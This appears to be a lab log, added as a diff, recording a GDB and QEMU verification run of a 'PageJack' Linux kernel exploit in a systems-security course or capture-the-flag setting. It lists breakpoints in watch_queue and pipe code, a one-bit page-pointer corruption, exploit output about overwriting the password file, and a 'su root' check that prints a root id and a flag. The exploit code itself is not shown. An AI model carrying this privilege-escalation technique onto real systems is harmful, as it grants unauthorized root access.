@@ -1,0 +1,55 @@
+PageJack GDB verification run: 2026-09-14
+
+Environment:
+  directory: /home/isadetective/Project/Sys-sec-lab/Page_Jack_pwn
+  QEMU: ./run_gdb.sh
+  GDB: gdb -q ./kernel/vmlinux -x ./gdb-pagejack.gdb
+  boot parameter: page_alloc.shuffle=0
+
+GDB startup:
+  Breakpoint 1: watch_queue.c:309, watch_queue_set_filter
+  Breakpoint 2: fs/pipe.c:785, alloc_pipe_info
+  Breakpoint 3: fs/pipe.c:718, pipe_release
+
+The startup allocation breakpoint was hit.  After:
+  disable 2 3
+  continue
+the guest reached its shell.
+
+The guest command was:
+  /exp/exp
+
+The entry breakpoint produced this call path:
+  watch_queue_set_filter
+  vfs_ioctl
+  __do_sys_ioctl
+  __se_sys_ioctl
+  __x64_sys_ioctl
+
+At the conditional breakpoint on kernel/watch_queue.c:367 with `i == 3`, GDB printed:
+  i = 3
+  tf[i].type = 0x306
+  filter.nr_filters = 0x4
+  sizeof(unsigned long) = 0x8
+
+At the same conditional-breakpoint stop, the `type_filter + 0x60` word was
+observed before and after `__set_bit()` as:
+  before: 0xffffea00001ec780
+  after:  0xffffea00001ec7c0
+  delta:   0x40
+
+The successful QEMU output was:
+  found pipe coincide at idx:37 and 36
+  uaf one of the pipe_buffer->page
+  Edit pwd file->f_mode...
+  Write Success:106!
+
+The final guest verification was:
+  echo Lotus | su root -c 'id; strings /flag | head -n 1'
+
+and printed:
+  uid=0(root) gid=0(root) groups=0(root)
+  flag{PageJack_Demo_Flag_ZJU_RKP}
+
+This file records the live GDB/QEMU run.  Addresses and pipe indices are
+runtime values and may differ on another restart.
